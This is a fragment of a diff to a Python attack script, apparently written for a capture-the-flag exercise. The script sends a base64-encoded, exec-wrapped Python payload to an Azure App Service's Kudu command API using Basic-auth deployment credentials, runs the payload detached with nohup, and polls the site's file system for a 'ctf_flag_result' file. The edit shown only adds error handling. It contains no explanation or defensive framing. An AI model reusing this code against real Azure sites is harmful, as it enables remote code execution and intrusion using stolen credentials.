@@ -88,8 +88,11 @@ command = "nohup python3 -c \"import base64;exec(base64.b64decode('" + encoded +
 body = json.dumps({"command": command, "dir": "site/wwwroot"}).encode()
 auth = base64.b64encode((ku + ":" + kp).encode()).decode()
 req = urllib.request.Request("https://" + APP + ".scm.azurewebsites.net/api/command", data=body, method="POST", headers={"Authorization": "Basic " + auth, "Content-Type": "application/json"})
-result = urllib.request.urlopen(req, timeout=40).read()
-print(result.decode())
+try:
+    result = urllib.request.urlopen(req, timeout=15).read()
+except Exception as e:
+    result = ("kudu launch: " + repr(e)).encode()
+print(result.decode(errors="replace"))
 # Poll Kudu VFS for the detached worker result.
 result_url = "https://" + APP + ".scm.azurewebsites.net/api/vfs/site/wwwroot/ctf_flag_result"
 last = b""
